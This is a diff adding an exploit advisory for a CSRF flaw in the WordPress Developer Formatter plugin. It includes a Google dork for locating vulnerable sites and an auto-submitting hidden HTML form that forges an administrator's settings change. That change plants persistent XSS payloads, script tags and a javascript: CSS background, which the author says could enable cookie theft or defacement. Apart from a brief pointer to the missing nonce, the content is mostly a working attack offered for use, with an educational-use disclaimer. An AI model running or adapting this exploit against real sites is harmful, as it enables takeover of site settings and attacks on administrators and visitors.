@@ -1,0 +1,38 @@
+====================================================================================================================
+# Exploit Title: Wordpress Developer Formatter CSRF Vulnerability
+# Google Dork: inurl:devformatter/devformatter.php
+# Date: 21/01/13
+# Author: Junaid Hussain -[ illSecure Research Group ] -
+# Contact: illSecResearchGroup@Gmail.com | Website: illSecure.com
+# Software Link: http://wordpress.org/extend/plugins/devformatter/
+# Vendor: http://wordpress.org/extend/plugins/devformatter/
+# Tested on: CentOS 5  
+# Version: Wordpress Version 3.5, Should work on all versions.
+
+====================================================================================================================
+[#] Vulnerable Code
+Page: devinterface.php - Line: 46  
+ <form method="post" action="options-general.php?page=devformatter/devformatter.php">
+[#] no nonce given - Read: http://codex.wordpress.org/Function_Reference/wp_nonce_field
+====================================================================================================================
+// CSRF Exploit:
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<form method="post" action="http://[DOMAIN NAME]/wp-admin/options-general.php?page=devformatter/devformatter.php">
+<input name="usedevformat" style="display:none;" type="checkbox" checked/> 
+<input name="copyclipboartext" type="text" style="display:none;" value="&lt;/textarea&gt;<script>alert(/xss/)</script>"  />
+<input name="showtools" style="display:none;" type="checkbox" checked/> 
+<textarea name="devfmtcss" rows="6" cols="60" style="display:none;"> 
+	  body {
+  background-image: url('javascript:alert("XSS");') !important;
+}
+&lt;/textarea&gt;
+ </form></html>
+====================================================================================================================
+[#] copyclipboartext & devfmtcss are both vulnerable to persistent xss which could lead to cookie stealing,
+    malware distribution or even a defacememnt.
+[#] Disclaimer: This exploit is for Research/Educational/Academic purposes only, 
+                The Author of this exploit takes no responsibility for the way
+                you use this exploit, you are responsible for your own actions.	
+====================================================================================================================
+Original: http://illsecure.com/code/Wordpress-DevFormatter-CSRF-Vulnerability.txt
